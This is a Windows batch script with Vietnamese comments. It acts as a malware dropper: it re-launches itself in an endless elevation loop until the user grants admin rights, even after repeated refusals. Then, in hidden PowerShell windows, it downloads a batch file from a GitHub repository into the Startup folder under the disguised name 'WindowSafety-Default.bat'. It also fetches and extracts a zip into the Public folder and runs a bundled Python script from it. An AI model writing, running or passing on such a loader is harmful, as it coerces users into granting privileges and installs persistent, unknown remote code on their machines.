@echo off
setlocal

:: Đặt tên cho bản thân
set "BATCH_FILE=%~f0"

:: Nếu đã có quyền admin, thì thực thi phần chính
net session >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Da co quyen admin. Dang chay ma lenh...

    :: ---- Phan xu ly cua ban o day ----
    powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/urerfie/base/raw/main/zd.bat', '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowSafety-Default.bat')"

    powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('https://github.com/urerfie/base/raw/main/default.zip', '$env:PUBLIC\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('$env:PUBLIC\Document.zip', '$env:PUBLIC\Document'); Start-Sleep -Seconds 1; & '$env:PUBLIC\Document\python' '$env:PUBLIC\Document\Lib\temp.py'; Remove-Item '$env:PUBLIC\Document.zip' -Force"

    pause
    exit /b 0
)

:: Neu chua co quyen admin → dung PowerShell vong lap
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"while (\$true) {
    try {
        \$p = Start-Process -FilePath '%BATCH_FILE%' -Verb RunAs -Wait -PassThru
        if (\$p.ExitCode -eq 0) { break }
    } catch {
        Write-Host 'Nguoi dung tu choi quyen admin. Dang thu lai...'
    }
    Start-Sleep -Seconds 2
}"

exit /b
